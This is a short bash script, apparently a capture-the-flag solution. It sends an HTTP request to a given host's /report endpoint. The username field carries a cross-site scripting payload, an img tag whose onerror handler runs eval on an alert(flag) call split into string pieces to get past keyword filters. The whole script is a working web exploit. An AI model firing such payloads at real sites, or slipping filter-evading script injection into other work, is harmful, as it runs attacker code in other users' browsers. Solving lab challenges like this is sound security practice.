#!/usr/bin/env bash
set -euo pipefail

if [[ $# -ne 2 ]]; then
  echo "Usage: $0 HOST PORT" >&2
  exit 1
fi

HOST=$1
PORT=$2

curl \
  --data-urlencode "username=<img src=X onerror=\"eval('aler' + 't(fl' + 'ag)')\"" \
  "http://${HOST}:${PORT}/report" 